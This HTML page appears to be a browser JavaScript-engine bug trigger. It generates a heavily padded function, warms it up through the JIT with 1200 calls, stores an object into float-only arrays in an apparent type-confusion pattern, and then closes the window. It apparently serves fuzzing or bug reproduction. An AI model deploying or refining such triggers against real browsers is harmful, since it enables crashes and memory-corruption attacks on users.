<!DOCTYPE html><html><body><script>
function create_trigger() {
  let lines = [];
  lines.push("function test_sink_idx(x, arr, obj, idx, limit) {");
  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
  lines.push("  arr[idx] = obj;");
  lines.push("  let i = 0;");
  lines.push("  let res = null;");
  lines.push("  let dummy_var = 0;");
  lines.push("  while ((res = arr[idx]) !== null && i < limit) {");
  for (let j = 0; j < 80; j++) {
    lines.push(`    dummy_var = (dummy_var + ${j}) | 0;`);
  }
  lines.push("    i++;");
  lines.push("  }");
  lines.push("  return res;");
  lines.push("}");
  lines.push("return test_sink_idx;");
  let fn = new Function(lines.join("\n"))();
  return fn;
}

let fn = create_trigger();
let pool = [];
let dummy = { a: 1 };
for (let i = 0; i < 1200; i++) pool.push([1.1, 2.2, 3.3]);
for (let i = 0; i < 1200; i++) fn(1000, pool[i], dummy, 0, 1);

setTimeout(() => {
  window.close();
}, 2000);
</script></body></html>
